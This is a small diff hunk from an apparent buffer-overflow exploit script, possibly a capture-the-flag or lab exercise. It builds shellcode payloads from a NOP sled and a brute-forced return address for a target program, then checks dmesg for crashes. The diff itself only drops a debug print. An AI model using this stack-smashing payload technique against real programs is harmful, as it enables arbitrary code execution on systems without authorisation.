@@ -17,7 +17,6 @@ lines = ""
 
 for x in range(20):
     shc = nop * sled + code + nop * rem + p64(addr + x * 16)
-    print(len(shc))
     lines += f"""{program_name} ${str(shc)[1:]}\n"""
 
 lines += "dmesg | tail -n 1\n"
